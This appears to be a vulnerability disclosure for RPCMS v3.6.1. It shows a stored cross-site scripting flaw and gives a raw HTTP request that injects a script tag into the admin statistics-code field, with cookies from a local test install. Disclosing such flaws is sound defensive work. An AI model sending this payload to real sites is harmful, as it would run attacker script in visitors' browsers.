RPCMSv3.6.1 has persistent cross site scripting vulnerability in the statistical code function.

in the /admin/index.html directory, modify the statistics code block content

![image-20240425185945292](https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240425185945292.png)

```
POST /rpcms/admin/index/webPost.html HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: application/json, text/javascript, */*; q=0.01
Referer: http://127.0.0.1/rpcms/admin/index/webset.html
Sec-Fetch-Mode: cors
Origin: http://127.0.0.1
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
X-Requested-With: XMLHttpRequest
Cookie: session-name=MTcxMTUzODU2MXxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXyB-2MEmWBEhT2LmkrXFrKm9hHzDFKVLoIWHcrKauUlWQ==; X8Kk_2132_logintime=1713010988; X8Kk_2132_saltkey=sb50OXyE; X8Kk_2132_lastvisit=1713007324; XDEBUG_SESSION=PHPSTORM; PHPSESSID=sgbb1cb5ibsh92vo7t7uevdojs
Content-Length: 719

_t=1714042985639&isDevelop=0&webStatus=0&cateAlias=0&logAlias=0&pageAlias=0&tagAlias=0&commentStatus=0&commentCheck=0&commentCN=0&commentVcode=0&logOrder=id&webName=&webLogo=%2Fuploads%2F202404%2Feaad51b7bcc681b30af114837f4eb686.png&seoTitle=&keyword=&description=&icp=&key=URD9Y0ED-MCQD3A5B-33B0-A754-91AD-7B29C80219CB&totalCode=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E&closeText=&pagesize=10&pageMax=&fileTypes=rar%2Czip%2Cgz%2Cgif%2Cjpg%2Cjpeg%2Cpng%2Ctxt%2Cpdf%2Cdocx%2Cdoc%2Cxls%2Cxlsx&fileSize=20&logWeight=&api_token_key=&api_max_req=&wap_domain=&wap_template=&id_encrypt_salt=&adminLoginErrMax=&adminLoginErrTime=30&attImgWitch=400&attImgHeight=400&captha_style=1&commentSort=new&commentPage=10&commentInterval=30
```

return to the homepage

![image-20240425185918318](https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240425185918318.png)
